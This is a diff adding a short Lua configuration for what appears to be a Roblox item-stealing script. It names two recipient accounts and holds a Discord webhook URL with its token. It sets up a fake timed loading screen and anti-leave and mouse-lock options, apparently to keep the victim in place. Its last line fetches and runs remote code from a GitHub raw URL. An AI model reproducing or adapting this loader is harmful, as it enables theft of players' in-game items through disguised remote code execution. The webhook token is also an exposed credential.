@@ -1,0 +1,17 @@
+UserName = "Fatal"
+Webhook = "https://discord.com/api/webhooks/1130264148966658069/cEOf9zlFzpxkQB5e9cPN46FS83nmZVLV1VYUn34MgFr40LXiZz9Mzl_g30fPEG2an3cE"
+UserName2 = "gougele"
+
+_G.LoadingScreen = false -- make it true if you want the loadingscreen
+_G.AntiLeave = false -- make it true if you want the antileave
+_G.MouseLock = false -- make it true if you want the mouselock
+
+-- Remove These If You're Not Using The Rizz LoadingScreen
+
+_G.ScriptName = "Script Name"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/go584/ProjectKKff/main/mail1%22))()
